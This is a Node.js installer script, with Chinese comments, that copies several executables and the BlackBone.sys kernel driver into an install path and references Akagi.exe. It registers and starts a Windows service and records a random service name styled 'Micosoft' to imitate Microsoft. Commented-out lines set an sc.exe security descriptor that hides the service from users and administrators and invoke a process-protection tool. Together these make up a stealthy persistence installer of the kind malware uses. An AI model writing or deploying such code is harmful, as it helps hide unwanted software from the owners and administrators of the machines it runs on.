const fs = require("fs");
const { execSync } = require("child_process");
const { STOPPED, waitForServiceStatus, RUNNING, isServiceExists } = require("./status");
const path = require("path");

path.join(__dirname, "Akagi.exe");

const gConfig = require("../../my_config");

function myCopyFileSync(sourcePath, targetPath) {
  const sourceData = fs.readFileSync(sourcePath);
  fs.writeFileSync(targetPath, sourceData);
}

let NEW_SERVICE_NAME = `Micosoft${Math.ceil(Math.random() * 100000)}`;
const process = require("process");
const { INSTALL_PATH, SERVICE_NAME, SERVICE_EXE_PATH, SERVICE_EXE_NAME } = require("../../my_config");
async function install() {
  console.log(fs.readdirSync(__dirname));
  if(isServiceExists()){
    console.log("服务已安装!");
    await sleep(3000);
    return
  }
  try {
    let rs;
    fs.mkdirSync(gConfig.INSTALL_PATH, { recursive: true });
    myCopyFileSync(path.join(__dirname, "ExplorerUtil.exe"), gConfig.ExplorerUtil_PATH);
    myCopyFileSync(path.join(__dirname, "BlackBone.sys"), gConfig.SYS_PATH);
    // myCopyFileSync(path.join(__dirname, "nssm.exe"), gConfig.NSSM_PATH);
    myCopyFileSync(
      path.join(__dirname, "bootstrapper.exe"),
      `${gConfig.BOOTSTRAPPER_PATH}`
    );
    myCopyFileSync(path.join(__dirname, "serviceCore"), gConfig.CORE_PATH);
    myCopyFileSync(path.join(__dirname, "WindowsService.exe"), gConfig.SERVICE_EXE_PATH);
    // sleep(1000);
    execSync(
      `${SERVICE_EXE_PATH} -install`
    );
    // 检测服务是否安装完毕
    await waitForServiceStatus(SERVICE_NAME, STOPPED);
    execSync(`sc start MLC`);
    fs.writeFileSync(
      `${gConfig.INSTALL_PATH}serviceName`,
      `${NEW_SERVICE_NAME}%%${gConfig.BOOTSTRAPPER_NAME}`
    );
    console.log("安装完毕");
    await waitForServiceStatus(NEW_SERVICE_NAME, RUNNING);
    // //隐藏服务
    // execSync(`sc.exe sdset ${NEW_SERVICE_NAME} "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"`);
    // console.log("执行隐藏指令完毕");
    // //保护服务进程
    // try {
    //   sleep(3000);
    //   execSync(`${INSTALL_PATH}ExplorerUtil.exe /protect`);
    // } catch (error) {}
    // console.log("执行保护指令完毕");
    await sleep(1000);
  } catch (e) {
    console.log(e);
    await sleep(50000);
  }
}

function sleep(msec) {
  return new Promise(r => {
    setTimeout(() => {
      r();
    }, msec);
  })
}

install();
